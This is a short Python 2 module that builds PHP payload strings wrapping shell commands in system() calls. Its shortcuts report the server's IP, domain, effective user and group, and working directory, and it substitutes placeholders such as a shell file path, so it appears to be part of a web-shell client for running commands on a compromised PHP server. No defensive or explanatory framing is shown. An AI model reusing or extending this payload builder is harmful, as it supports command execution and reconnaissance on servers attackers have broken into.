#!/usr/bin/env python

def php_exec( cmd ):

	cmd = cmd.replace('\\','\\\\').replace('"','\\\"').replace('$','\\$').replace('\\$\\$','$')

	if cmd == 'ip':
		return "echo {$_SERVER['REMOTE_ADDR']}"

	elif cmd == 'domain':
		return "echo {$_SERVER['SERVER_NAME']}"

	elif cmd == 'whoami':
		return '''echo ".posix_getpwuid(posix_geteuid())['name'].";echo ".posix_getpwuid(posix_getegid())['name']."'''

	elif cmd == 'cwd':
		return 'echo ".getcwd()."'

	replace = { '$DOC_ROOT': '''{$_SERVER['DOCUMENT_ROOT']}''',
				'$SHELL_FILE': '''{$_SERVER['PHP_SELF']}''',
				'$CLIENT_IP':'''{$_SERVER['REMOTE_ADDR']}''' }

	for key,value in replace.iteritems(): cmd = cmd.replace( key, value )

	return cmd

def php_system():
	return 'system("{}");'

def cmd_chain( language, iter ):
	return language.format(';'.join( iter )+';')

def php( cmds=[], method=None ):
	return cmd_chain(method or php_system(), map(php_exec,cmds))
